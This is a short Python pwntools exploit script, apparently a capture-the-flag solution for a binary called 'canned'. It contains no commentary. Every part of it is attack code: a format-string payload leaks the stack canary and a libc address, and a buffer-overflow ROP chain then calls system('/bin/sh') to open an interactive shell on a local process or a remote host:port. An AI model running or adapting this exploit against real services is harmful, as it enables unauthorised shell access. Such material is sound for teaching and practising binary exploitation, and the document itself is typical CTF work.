#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './canned'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc6_2.27-3ubuntu1.3_amd64.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

prdi = 0x00000000004012bb # pop rdi ; ret

sla('Say something please\n','%15$p%17$p')
canary = int(rc(len('0xb12bbce59c5ee300')),16)
libcbase = int(rc(len('0x7f19e320d0b3')),16) - 0x21bf7
info_addr('canary')
info_addr('libcbase')
sh = libc.search('/bin/sh').next() + libcbase
system = libc.sym['system'] + libcbase
info_addr('system')
info_addr('sh')

debug()
payload = cyclic(24)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(prdi+1)
payload += p64(prdi) + p64(sh)
payload += p64(system)

sl(payload)
p.interactive()

